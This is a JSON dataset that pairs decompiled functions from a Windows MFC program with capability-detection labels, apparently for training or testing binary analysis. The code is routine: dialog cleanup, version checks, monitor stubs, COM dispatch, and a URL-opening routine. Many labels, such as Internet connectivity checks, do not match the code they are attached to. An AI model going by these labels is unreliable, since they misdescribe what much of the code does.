{
    "00428413": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid fcn.00428413(void)\n\n{\n    code **extraout_ECX;\n    int32_t unaff_EBP;\n    uint *in_FS_OFFSET;\n    uint var_10h;\n    uint var_ch;\n    uint var_4h;\n    \n    fcn.004118b0();\n    *(unaff_EBP + -0x10) = extraout_ECX;\n    *extraout_ECX = vtable.CDialog.0;\n    *(unaff_EBP + -4) = 0;\n    if (extraout_ECX[7] != NULL) {\n        fcn.0042b688();\n    }\n    *(unaff_EBP + -4) = 0xffffffff;\n    fcn.0042bd92();\n    *in_FS_OFFSET = *(unaff_EBP + -0xc);\n    return;\n}\n",
        "token_count": 195
    },
    "null": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "",
        "token_count": 0
    },
    "00433ab0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00433ab0(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 4) == 0) {\n        return 0;\n    }\n    uVar1 = fcn.00433a86();\n    uVar1 = (*_sym.imp.GDI32.dll_DeleteObject)(uVar1);\n    return uVar1;\n}\n",
        "token_count": 88
    },
    "004018b0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __thiscall fcn.004018b0(int32_t *param_1, int32_t param_2)\n\n{\n    int32_t *piVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t **ppiVar7;\n    int32_t *unaff_EBP;\n    uint *puVar8;\n    uint *puVar9;\n    \n    iVar5 = *param_1;\n    if (param_2 < *(iVar5 + -0xc)) {\n        param_2 = *(iVar5 + -0xc);\n    }\n    if (1 < *(iVar5 + -4)) {\n        puVar2 = *param_1;\n        ppiVar7 = puVar2 + -4;\n        iVar5 = puVar2[-3];\n        puVar3 = (**(**ppiVar7 + 0x10))();\n        iVar4 = (***puVar3)(param_2, 1);\n        if (iVar4 == 0) {\n            iVar4 = fcn.00401440();\n        }\n        if (iVar5 < param_2) {\n            param_2 = iVar5;\n        }\n        puVar3 = iVar4 + 0x10;\n        puVar9 = puVar3;\n        puVar8 = puVar2;\n        for (uVar6 = param_2 + 1U >> 2; uVar6 != 0; uVar6 = uVar6 - 1) {\n            *puVar9 = *puVar8;\n            puVar9 = puVar9 + 1;\n            puVar8 = puVar8 + 1;\n        }\n        for (uVar6 = param_2 + 1U & 3; uVar6 != 0; uVar6 = uVar6 - 1) {\n            *puVar9 = *puVar8;\n            puVar8 = puVar8 + 1;\n            puVar9 = puVar9 + 1;\n        }\n        *(iVar4 + 4) = iVar5;\n        piVar1 = puVar2 + -1;\n        LOCK();\n        iVar5 = *piVar1;\n        *piVar1 = *piVar1 + -1;\n        if (iVar5 == 1 || iVar5 + -1 < 0) {\n            (**(**ppiVar7 + 4))(ppiVar7);\n        }\n        *unaff_EBP = puVar3;\n        return;\n    }\n    iVar5 = *(iVar5 + -8);\n    if (iVar5 < param_2) {\n        if (iVar5 < 0x401) {\n            iVar5 = iVar5 * 2;\n        }\n        else {\n            iVar5 = iVar5 + 0x400;\n        }\n        if (iVar5 < param_2) {\n            iVar5 = param_2;\n        }\n        iVar5 = (**(**(*param_1 + -0x10) + 8))(*param_1 + -0x10, iVar5, 1);\n        if (iVar5 == 0) {\n            iVar5 = fcn.00401440();\n        }\n        *param_1 = iVar5 + 0x10;\n        return;\n    }\n    return;\n}\n",
        "token_count": 717
    },
    "00403e60": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403e60(int32_t **param_1)\n\n{\n    int32_t **arg_8h;\n    int32_t *piVar1;\n    \n    piVar1 = *param_1;\n    while (piVar1 != NULL) {\n        arg_8h = *param_1;\n        *param_1 = *arg_8h;\n        fcn.00411031(arg_8h);\n        piVar1 = *param_1;\n    }\n    return;\n}\n",
        "token_count": 111
    },
    "004057f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint32_t fcn.004057f0(uint *param_1, uint param_2)\n\n{\n    char *pcVar1;\n    char cVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    char *pcVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint *puVar8;\n    ushort *puVar9;\n    uchar auStack548 [4];\n    uint uStack544;\n    uint uStack540;\n    uint uStack536;\n    \n    if ((param_1 != NULL) && (*param_1 != '\\0')) {\n        uStack536 = param_2;\n        uStack540 = 0;\n        uStack544 = 0;\n        auStack548 = param_1;\n        uVar3 = (*_sym.imp.SHELL32.dll_ShellExecuteA)();\n        if ((uVar3 < 0x21) && (iVar4 = fcn.004050f0(),  iVar4 == 0)) {\n            puVar7 = auStack548 + 3;\n            do {\n                puVar6 = puVar7;\n                puVar7 = puVar6 + 1;\n            } while (*(puVar6 + 1) != '\\0');\n            *(puVar6 + 1) = str._shellopencommand._0_4_;\n            *(puVar6 + 5) = str._shellopencommand._4_4_;\n            *(puVar6 + 9) = str._shellopencommand._8_4_;\n            *(puVar6 + 0xd) = str._shellopencommand._12_4_;\n            *(puVar6 + 0x11) = str._shellopencommand._16_4_;\n            iVar4 = fcn.004050f0(0x80000000);\n            if (iVar4 == 0) {\n                pcVar5 = fcn.00411323(&uStack544, \"\\\"%1\\\"\");\n                if ((pcVar5 == NULL) && (pcVar5 = fcn.00411323(&uStack544, 0x44eed4),  pcVar5 == NULL)) {\n                    puVar7 = &uStack544;\n                    do {\n                        puVar6 = puVar7;\n                        puVar7 = puVar6 + 1;\n                    } while (*puVar6 != '\\0');\n                    pcVar5 = puVar6 + -1;\n                }\n                else {\n                    *pcVar5 = '\\0';\n                }\n                puVar9 = pcVar5 + -1;\n                do {\n                    pcVar1 = puVar9 + 1;\n                    puVar9 = puVar9 + 1;\n                } while (*pcVar1 != '\\0');\n                *puVar9 = *0x44eed0;\n                puVar7 = param_1;\n                do {\n                    cVar2 = *puVar7;\n                    puVar7 = puVar7 + 1;\n                } while (cVar2 != '\\0');\n                puVar6 = pcVar5 + -1;\n                do {\n                    pcVar5 = puVar6 + 1;\n                    puVar6 = puVar6 + 1;\n                } while (*pcVar5 != '\\0');\n                puVar8 = param_1;\n                for (uVar3 = puVar7 - param_1 >> 2; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar6 = *puVar8;\n                    puVar8 = puVar8 + 1;\n                    puVar6 = puVar6 + 1;\n                }\n                for (uVar3 = puVar7 - param_1 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n                    *puVar6 = *puVar8;\n                    puVar8 = puVar8 + 1;\n                    puVar6 = puVar6 + 1;\n                }\n                (**0x4630b0)();\n                uVar3 = (*_sym.imp.KERNEL32.dll_WinExec)();\n            }\n        }\n        return uVar3;\n    }\n    return 0x24;\n}\n",
        "token_count": 899
    },
    "00406560": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.00406560(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    uint32_t uStack160;\n    int32_t aiStack156 [38];\n    \n    piVar3 = aiStack156;\n    for (iVar2 = 0x24; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *piVar3 = 0;\n        piVar3 = piVar3 + 1;\n    }\n    uStack160 = 0x94;\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetVersionExA)(&uStack160);\n    if (((iVar2 == 0) || (aiStack156[2] != 2)) || (uVar1 = 1,  uStack160 < 6)) {\n        uVar1 = 0;\n    }\n    return uVar1;\n}\n",
        "token_count": 199
    },
    "0040aa41": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nint32_t * __thiscall fcn.0040aa41(int32_t *param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.0040a9d3();\n    *param_1 = iVar1;\n    if ((*param_2 != 0) && (iVar1 == 0)) {\n        fcn.00401100(0x8007000e);\n    }\n    return param_1;\n}\n",
        "token_count": 106
    },
    "0040ab53": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0040ab53(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint lpVersionInformation;\n    uint var_94h;\n    uint var_88h;\n    uint var_4h;\n    \n    var_4h = *0x4640c8;\n    puVar2 = &var_94h;\n    for (iVar1 = 0x24; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    fcn.0041176c();\n    return;\n}\n",
        "token_count": 171
    },
    "0040ace2": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040ace2(int32_t arg_8h, int32_t arg_ch, uint32_t arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = fcn.0040aba0();\n    pcVar1 = _sym.imp.USER32.dll_GetSystemMetrics;\n    if (iVar2 == 0) {\n        if (((arg_10h & 3) == 0) &&\n           ((((arg_8h < 0 || (iVar2 = (*_sym.imp.USER32.dll_GetSystemMetrics)(0),  iVar2 <= arg_8h)) || (arg_ch < 0)) ||\n            (iVar2 = (*pcVar1)(1),  iVar2 <= arg_ch)))) {\n            uVar3 = 0;\n        }\n        else {\n            uVar3 = 0x12340042;\n        }\n    }\n    else {\n        uVar3 = (**0x466bc4)(arg_8h, arg_ch, arg_10h);\n    }\n    return uVar3;\n}\n",
        "token_count": 239
    },
    "0040af6f": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040af6f(int32_t arg_8h, int32_t arg_ch, uint32_t *arg_10h)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    \n    iVar2 = fcn.0040aba0();\n    pcVar1 = _sym.imp.KERNEL32.dll_lstrcpynA;\n    if (iVar2 == 0) {\n        if ((arg_8h == 0) && (arg_ch == 0)) {\n            if ((arg_10h == NULL) || (*arg_10h < 0x1a8)) {\n                uVar3 = 0;\n            }\n            else {\n                (*_sym.imp.KERNEL32.dll_lstrcpynA)(arg_10h + 1, \"DISPLAY\", 0x20);\n                (*pcVar1)(arg_10h + 9, \"DISPLAY\", 0x80);\n                arg_10h[0x29] = 5;\n                uVar3 = 1;\n            }\n        }\n        else {\n            uVar3 = 0;\n        }\n        return uVar3;\n    }\n    // WARNING: Could not recover jumptable at 0x0040af7c. Too many branches\n    // WARNING: Treating indirect jump as call\n    uVar3 = (**0x466bd0)();\n    return uVar3;\n}\n",
        "token_count": 309
    },
    "0040afdd": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_48h\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.0040afdd(int32_t *arg_8h, int32_t arg_ch, uint noname_2, uint noname_3, uint32_t arg_18h, uint32_t *arg_1ch, \n            uint *arg_20h, uint noname_7, int32_t *arg_28h)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint16_t *puVar4;\n    code *pcVar5;\n    int32_t *piVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    int32_t iVar9;\n    int32_t iVar10;\n    int32_t *piVar11;\n    uint var_48h;\n    uint *var_44h;\n    uint *var_40h;\n    uint *var_34h;\n    uint var_30h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    puVar7 = arg_1ch;\n    piVar6 = arg_8h;\n    iVar10 = 0;\n    var_30h._0_2_ = 0;\n    if (arg_8h == NULL) {\n        return -0x7ff8ffa9;\n    }\n    if (arg_1ch == NULL) {\n        return -0x7ffdfff8;\n    }\n    uVar2 = arg_1ch[2];\n    if (5 < uVar2) {\n        return -0x7ffdfff2;\n    }\n    arg_8h = NULL;\n    if (arg_1ch[3] != 0) {\n        arg_1ch = arg_1ch[1];\n        do {\n            uVar3 = *arg_1ch;\n            if (uVar2 <= uVar3) {\n                return -0x7ffdfff2;\n            }\n            arg_1ch = arg_1ch + 1;\n            arg_8h = arg_8h + 1;\n            (&var_44h)[uVar3] = *puVar7 + iVar10;\n            iVar10 = iVar10 + 0x10;\n        } while (arg_8h < puVar7[3]);\n    }\n    if (arg_8h < uVar2) {\n        iVar10 = arg_8h * 0x10 + *puVar7;\n        iVar9 = uVar2 - arg_8h;\n        piVar11 = &var_48h + (uVar2 - arg_8h);\n        do {\n            *piVar11 = iVar10;\n            iVar10 = iVar10 + 0x10;\n            piVar11 = piVar11 + -1;\n            iVar9 = iVar9 + -1;\n        } while (iVar9 != 0);\n    }\n    iVar10 = -0x7ffdfffd;\n    if (arg_28h == NULL) {\n        arg_28h = &arg_18h;\n    }\n    if (arg_20h == NULL) {\n        arg_20h = &var_30h;\n    }\n    (*_sym.imp.OLEAUT32.dll_VariantClear)(&var_10h);\n    pcVar5 = _sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime;\n    if (0x12 < arg_ch + 0x139aU) goto code_r0x0040b565;\n    // switch table (19 cases) at 0x40b578\n    switch(*((arg_ch + 0x139aU) * 4 + 0x40b578)) {\n    case 0x40b0c2:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 100))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3]);\n            goto code_r0x0040b565;\n        }\n        break;\n    case 0x40b0eb:\n        if (puVar7[2] == 2) {\n            if (*var_44h != 3) {\n                iVar10 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&var_10h, var_44h, 0, 3);\n                if (iVar10 < 0) goto code_r0x0040b111;\n                var_44h = &var_10h;\n            }\n            arg_18h = var_44h[2];\n            if (*var_40h != 3) {\n                iVar10 = (*pcVar5)(&var_10h, var_40h, 0, 3);\n                if (iVar10 < 0) {\ncode_r0x0040b13f:\n                    *arg_28h = 1;\n                    goto code_r0x0040b565;\n                }\n                var_40h = &var_10h;\n            }\n            iVar10 = (**(*piVar6 + 0x60))(piVar6, arg_18h, var_40h[2], arg_20h);\n            goto code_r0x0040b565;\n        }\n        break;\n    case 0x40b162:\n        if (puVar7[2] == 2) {\n            if (*var_44h != 3) {\n                iVar10 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&var_10h, var_44h, 0, 3);\n                if (iVar10 < 0) goto code_r0x0040b111;\n                var_44h = &var_10h;\n            }\n            iVar10 = (**(*piVar6 + 0x5c))(piVar6, var_44h[2], *var_40h, var_40h[1], var_40h[2], var_40h[3], arg_20h);\n            goto code_r0x0040b565;\n        }\n        break;\n    case 0x40b1ab:\n        if (puVar7[2] == 5) {\n            iVar10 = 0;\n            do {\n                puVar4 = (&var_44h)[iVar10];\n                uVar1 = *puVar4;\n                if (((uVar1 & 0x4000) == 0) || ((uVar1 & 0xf) == 0)) {\n                    *arg_28h = iVar10;\n                    break;\n                }\n                if ((uVar1 & 0xc) == 0) {\n                    iVar9 = *(puVar4 + 4);\n                }\n                else {\n                    (*_sym.imp.OLEAUT32.dll_VariantCopy)(*(puVar4 + 4));\n                    puVar4 = (&var_44h)[iVar10];\n                    **(puVar4 + 4) = 3;\n                    iVar9 = *(puVar4 + 4) + 8;\n                }\n                (&var_20h)[iVar10] = iVar9;\n                iVar10 = iVar10 + 1;\n            } while (iVar10 < 4);\n            iVar10 = (**(*piVar6 + 0x58))\n                               (piVar6, var_20h, var_1ch, var_18h, var_14h, *var_34h, var_34h[1], var_34h[2], var_34h[3]\n                               );\n            goto code_r0x0040b565;\n        }\n        break;\n    case 0x40b221:\n        if (puVar7[2] == 2) {\n            if (*var_44h != 3) {\n                iVar10 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&var_10h, var_44h, 0, 3);\n                if (iVar10 < 0) goto code_r0x0040b111;\n                var_44h = &var_10h;\n            }\n            iVar10 = (**(*piVar6 + 0x54))(piVar6, var_44h[2], *var_40h, var_40h[1], var_40h[2], var_40h[3]);\n            goto code_r0x0040b565;\n        }\n        break;\n    case 0x40b26b:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x50))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\ncode_r0x0040b28e:\n            if (-1 < iVar10) {\n                *arg_20h = 8;\n            }\n            goto code_r0x0040b565;\n        }\n        break;\n    case 0x40b2a5:\n        iVar10 = (**(*piVar6 + 0x4c))(piVar6, arg_20h);\n        goto code_r0x0040b565;\n    case 0x40b2b3:\n        iVar10 = (**(*piVar6 + 0x48))(piVar6, arg_20h);\n        goto code_r0x0040b565;\n    case 0x40b2c1:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x44))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x0040b28e;\n        }\n        break;\n    case 0x40b2e6:\n        if (puVar7[2] == 2) {\n            uVar1 = *var_44h;\n            if (((uVar1 & 0x4000) != 0) && ((uVar1 & 0xc) == 0)) {\n                iVar10 = -0x7ffdfffb;\ncode_r0x0040b111:\n                *arg_28h = 0;\n                goto code_r0x0040b565;\n            }\n            if (uVar1 == 0x400c) {\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(var_44h[2]);\n                *var_44h[2] = 8;\n                puVar8 = var_44h[2] + 8;\n            }\n            else if (uVar1 == 0x4008) {\n                puVar8 = var_44h[2];\n            }\n            else {\n                (*_sym.imp.OLEAUT32.dll_VariantCopy)(var_44h);\n                puVar8 = var_44h + 2;\n                *var_44h = 8;\n            }\n            iVar10 = (**(*piVar6 + 0x40))(piVar6, puVar8, *var_40h, var_40h[1], var_40h[2], var_40h[3], arg_20h + 2);\n            goto code_r0x0040b35c;\n        }\n        break;\n    case 0x40b373:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x3c))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x0040b28e;\n        }\n        break;\n    case 0x40b39b:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x38))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h);\n            goto code_r0x0040b565;\n        }\n        break;\n    case 0x40b3bf:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x34))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h);\n            goto code_r0x0040b565;\n        }\n        break;\n    case 0x40b3e3:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x30))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x0040b28e;\n        }\n        break;\n    case 0x40b40b:\n        if ((arg_18h & 2) == 0) {\n            if ((arg_18h & 4) == 0) goto code_r0x0040b48f;\n            if (puVar7[2] == 2) {\n                var_20h = *var_44h;\n                var_1ch = var_44h[1];\n                var_18h = var_44h[2];\n                var_14h = var_44h[3];\n                if (*var_40h != 8) {\n                    iVar10 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&var_10h, var_40h, 0, 3);\n                    if (iVar10 < 0) goto code_r0x0040b13f;\n                    var_40h = &var_10h;\n                }\n                iVar10 = (**(*piVar6 + 0x6c))(piVar6, var_20h, var_1ch, var_18h, var_14h, var_40h[2]);\n                goto code_r0x0040b565;\n            }\n        }\n        else if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x2c))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x0040b28e;\n        }\n        break;\n    case 0x40b48f:\ncode_r0x0040b48f:\n        if ((arg_18h & 2) == 0) {\n            if ((arg_18h & 4) == 0) goto code_r0x0040b513;\n            if (puVar7[2] == 2) {\n                var_20h = *var_44h;\n                var_1ch = var_44h[1];\n                var_18h = var_44h[2];\n                var_14h = var_44h[3];\n                if (*var_40h != 8) {\n                    iVar10 = (*_sym.imp.OLEAUT32.dll_VariantTimeToDosDateTime)(&var_10h, var_40h, 0, 3);\n                    if (iVar10 < 0) goto code_r0x0040b13f;\n                    var_40h = &var_10h;\n                }\n                iVar10 = (**(*piVar6 + 0x68))(piVar6, var_20h, var_1ch, var_18h, var_14h, var_40h[2]);\n                goto code_r0x0040b565;\n            }\n        }\n        else if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x28))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x0040b28e;\n        }\n        break;\n    case 0x40b513:\ncode_r0x0040b513:\n        if (puVar7[2] == 1) {\n            iVar10 = (**(*piVar6 + 0x24))(piVar6, *var_44h, var_44h[1], var_44h[2], var_44h[3], arg_20h + 2);\n            goto code_r0x0040b557;\n        }\n        break;\n    case 0x40b538:\n        iVar10 = (**(*piVar6 + 0x20))(piVar6, arg_20h + 2);\ncode_r0x0040b35c:\n        if (-1 < iVar10) {\n            *arg_20h = 3;\n        }\n        goto code_r0x0040b565;\n    case 0x40b54a:\n        iVar10 = (**(*piVar6 + 0x1c))(piVar6, arg_20h + 2);\ncode_r0x0040b557:\n        if (-1 < iVar10) {\n            *arg_20h = 9;\n        }\n        goto code_r0x0040b565;\n    }\n    iVar10 = -0x7ffdfff2;\ncode_r0x0040b565:\n    (*_sym.imp.OLEAUT32.dll_VariantCopy)(&var_10h);\n    return iVar10;\n}\n",
        "token_count": 3898
    },
    "0040b5c4": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nuint __cdecl fcn.0040b5c4(uint noname_0, int32_t arg_ch, uint32_t arg_10h, uint noname_3, int32_t arg_18h)\n\n{\n    bool bVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_1h;\n    \n    uVar3 = 0;\n    if (arg_10h != 0) {\n        do {\n            bVar1 = false;\n            uVar4 = 0;\n            do {\n                iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpW)(*(arg_ch + uVar3 * 4), *(uVar4 + 0x463500));\n                if (iVar2 == 0) {\n                    bVar1 = true;\n                    *(arg_18h + uVar3 * 4) = *(uVar4 + 0x4634b0);\n                }\n                uVar4 = uVar4 + 4;\n            } while (uVar4 < 0x4c);\n            if (!bVar1) {\n                return 0x80020006;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < arg_10h);\n    }\n    return 0;\n}\n",
        "token_count": 305
    },
    "0040b7ef": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040b7ef(int32_t param_1)\n\n{\n    uint uVar1;\n    \n    if (*(param_1 + 0xc) == 0) {\n        return 0;\n    }\n    uVar1 = (**(**(param_1 + 0xc) + 0xc))(*(param_1 + 0xc), 0);\n    return uVar1;\n}\n",
